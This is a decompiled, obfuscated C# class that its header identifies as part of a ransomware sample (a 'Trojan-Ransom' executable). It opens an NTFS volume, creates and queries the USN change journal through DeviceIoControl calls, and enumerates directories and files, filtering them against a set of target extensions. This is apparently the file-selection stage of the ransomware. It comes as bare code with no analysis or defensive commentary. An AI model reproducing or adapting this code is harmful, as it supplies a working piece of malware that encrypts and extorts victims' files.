// Decompiled with JetBrains decompiler
// Type: EbNNdTmxNaUt.aMKFziBBCmob
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B8444C5B-FCC9-4B9F-A06C-7304BA49E3C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.Win32.Generic-1d4db8733c5f11ee8fca530aeb4a91069de04b1af64cbe1fa3ae2d3572a6e554.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace EbNNdTmxNaUt
{
  public sealed class aMKFziBBCmob
  {
    [NonSerialized]
    internal static GetString \u0089;

    public void npFmhzJJPSuN(
      string PzYaZUPOOfK,
      HashSet<string> OnSVJrtUIBn,
      out Dictionary<ulong, gscyLTjmBf> qrnSaygDPkbER,
      out Dictionary<ulong, gscyLTjmBf> YXoVGwdUQxRA)
    {
      YXoVGwdUQxRA = new Dictionary<ulong, gscyLTjmBf>();
      qrnSaygDPkbER = new Dictionary<ulong, gscyLTjmBf>();
      IntPtr zero = IntPtr.Zero;
      IntPtr YAVFBlAhoNamTnB = IntPtr.Zero;
      try
      {
        this.uAZUJuvsOHm(PzYaZUPOOfK, YXoVGwdUQxRA);
        this.YUbSpEAGMMly(PzYaZUPOOfK, out YAVFBlAhoNamTnB);
        this.VoWZVVWEMkANjJkB(YAVFBlAhoNamTnB);
        this.TuYlwbXHtKtn(ref zero, YAVFBlAhoNamTnB);
        this.bwlaktCXLuVsA(zero, ref qrnSaygDPkbER, OnSVJrtUIBn, YXoVGwdUQxRA, YAVFBlAhoNamTnB);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message, (object) ex);
        for (Exception innerException = ex.InnerException; innerException != null; innerException = innerException.InnerException)
          Console.WriteLine(innerException.Message, (object) innerException);
        throw new ApplicationException(aMKFziBBCmob.\u0089(107365058), ex);
      }
      finally
      {
        if (YAVFBlAhoNamTnB.ToInt32() != -1)
          AmnWAzTthqCkpC.yEtcpwAMlbiph(YAVFBlAhoNamTnB);
        if (zero != IntPtr.Zero)
          Marshal.FreeHGlobal(zero);
      }
    }

    private void uAZUJuvsOHm([In] string obj0, [In] Dictionary<ulong, gscyLTjmBf> obj1)
    {
      string str = aMKFziBBCmob.\u0089(107365021) + obj0 + (object) Path.DirectorySeparatorChar;
      IntPtr num = AmnWAzTthqCkpC.aUbikvadNQZ(str, 0U, 3U, IntPtr.Zero, 3U, 33554432U, IntPtr.Zero);
      if (num.ToInt32() == -1)
        return;
      AmnWAzTthqCkpC.XVIrYtVRfertl ymeHoyFmYPgBojS = new AmnWAzTthqCkpC.XVIrYtVRfertl();
      if (AmnWAzTthqCkpC.NbmCjuxsyxA(num, out ymeHoyFmYPgBojS))
      {
        ulong key = (ulong) ymeHoyFmYPgBojS.AKMieZBVbpJP << 32 | (ulong) ymeHoyFmYPgBojS.BxuWXmtpCvps;
        gscyLTjmBf gscyLtjmBf = new gscyLTjmBf(str, 0UL);
        obj1.Add(key, gscyLtjmBf);
      }
      AmnWAzTthqCkpC.yEtcpwAMlbiph(num);
    }

    private void YUbSpEAGMMly(string hYLyZZklEKn, out IntPtr YAVFBlAhoNamTnB)
    {
      string str = aMKFziBBCmob.\u0089(107365021) + hYLyZZklEKn;
      YAVFBlAhoNamTnB = AmnWAzTthqCkpC.aUbikvadNQZ(str, 3221225472U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
    }

    private void bwlaktCXLuVsA(
      [In] IntPtr obj0,
      [In] ref Dictionary<ulong, gscyLTjmBf> obj1,
      [In] HashSet<string> obj2,
      [In] Dictionary<ulong, gscyLTjmBf> obj3,
      [In] IntPtr obj4)
    {
      IntPtr num1 = Marshal.AllocHGlobal(65544);
      AmnWAzTthqCkpC.HUofgknibtDW(num1, 65544);
      uint eMjVwOZDNgOz = 0;
      while (AmnWAzTthqCkpC.TsVpyJlobWCAzk(obj4, 590003U, obj0, sizeof (AmnWAzTthqCkpC.DVWIjMggjb), num1, 65544, out eMjVwOZDNgOz, IntPtr.Zero))
      {
        IntPtr num2 = new IntPtr(num1.ToInt32() + 8);
        AmnWAzTthqCkpC.kHLXLNBhhMWm kHlxlnBhhMwm;
        for (; eMjVwOZDNgOz > 60U; eMjVwOZDNgOz -= kHlxlnBhhMwm.jYzUggJtCmf)
        {
          kHlxlnBhhMwm = new AmnWAzTthqCkpC.kHLXLNBhhMWm(num2);
          if (((int) kHlxlnBhhMwm.qqsZWujGubBR & 16) != 0)
          {
            if (obj3.ContainsKey(kHlxlnBhhMwm.KatpPmNNpfL))
              throw new Exception(string.Format(aMKFziBBCmob.\u0089(107365044), (object) kHlxlnBhhMwm.KatpPmNNpfL, (object) kHlxlnBhhMwm.jWQZGcHzfCPq));
            obj3.Add(kHlxlnBhhMwm.KatpPmNNpfL, new gscyLTjmBf(kHlxlnBhhMwm.jWQZGcHzfCPq, kHlxlnBhhMwm.WdeRAUzrgltAdokFP));
          }
          else
          {
            bool flag = true;
            if (obj2 != null)
            {
              string extension = Path.GetExtension(kHlxlnBhhMwm.jWQZGcHzfCPq);
              flag = obj2.Contains(extension);
            }
            if (flag)
            {
              if (!obj1.ContainsKey(kHlxlnBhhMwm.KatpPmNNpfL))
              {
                obj1.Add(kHlxlnBhhMwm.KatpPmNNpfL, new gscyLTjmBf(kHlxlnBhhMwm.jWQZGcHzfCPq, kHlxlnBhhMwm.WdeRAUzrgltAdokFP));
              }
              else
              {
                gscyLTjmBf gscyLtjmBf = obj1[kHlxlnBhhMwm.KatpPmNNpfL];
                if (string.Compare(kHlxlnBhhMwm.jWQZGcHzfCPq, gscyLtjmBf.get_Name(), true) != 0)
                {
                  Console.WriteLine(aMKFziBBCmob.\u0089(107365007), (object) kHlxlnBhhMwm.KatpPmNNpfL, (object) kHlxlnBhhMwm.jWQZGcHzfCPq, (object) gscyLtjmBf.get_Name());
                  throw new Exception(string.Format(aMKFziBBCmob.\u0089(107365044), (object) kHlxlnBhhMwm.KatpPmNNpfL, (object) kHlxlnBhhMwm.jWQZGcHzfCPq));
                }
              }
            }
          }
          num2 = new IntPtr((long) num2.ToInt32() + (long) kHlxlnBhhMwm.jYzUggJtCmf);
        }
        Marshal.WriteInt64(obj0, Marshal.ReadInt64(num1, 0));
      }
      Marshal.FreeHGlobal(num1);
    }

    private void VoWZVVWEMkANjJkB([In] IntPtr obj0)
    {
      ulong num1 = 8388608;
      ulong num2 = 1048576;
      AmnWAzTthqCkpC.TcLJhgmKaZbNP structure;
      structure.KEhskOMFWYC = num1;
      structure.ybuJkQJtaJ = num2;
      int num3 = Marshal.SizeOf<AmnWAzTthqCkpC.TcLJhgmKaZbNP>(structure);
      IntPtr num4 = Marshal.AllocHGlobal(num3);
      AmnWAzTthqCkpC.HUofgknibtDW(num4, num3);
      Marshal.StructureToPtr<AmnWAzTthqCkpC.TcLJhgmKaZbNP>(structure, num4, true);
      AmnWAzTthqCkpC.TsVpyJlobWCAzk(obj0, 590055U, num4, num3, IntPtr.Zero, 0, out uint _, IntPtr.Zero);
    }

    private void TuYlwbXHtKtn([In] ref IntPtr obj0, [In] IntPtr obj1)
    {
      uint CeJJQiVALNudX = 0;
      AmnWAzTthqCkpC.jydZyqQbYyh BYTGvUigkBlTq = new AmnWAzTthqCkpC.jydZyqQbYyh();
      if (!AmnWAzTthqCkpC.yGznovWRSrpvIZ(obj1, 590068U, IntPtr.Zero, 0, out BYTGvUigkBlTq, sizeof (AmnWAzTthqCkpC.jydZyqQbYyh), out CeJJQiVALNudX, IntPtr.Zero))
        return;
      AmnWAzTthqCkpC.DVWIjMggjb structure;
      structure.VWTZZTpyukVwMh = 0UL;
      structure.cyiXmrMkWVq = 0L;
      structure.mupoJYbAfVREZR = BYTGvUigkBlTq.bFHZtDlXKkd;
      int cb = Marshal.SizeOf<AmnWAzTthqCkpC.DVWIjMggjb>(structure);
      obj0 = Marshal.AllocHGlobal(cb);
      AmnWAzTthqCkpC.HUofgknibtDW(obj0, cb);
      Marshal.StructureToPtr<AmnWAzTthqCkpC.DVWIjMggjb>(structure, obj0, true);
    }

    static aMKFziBBCmob() => Strings.CreateGetStringDelegate(typeof (aMKFziBBCmob));
  }
}
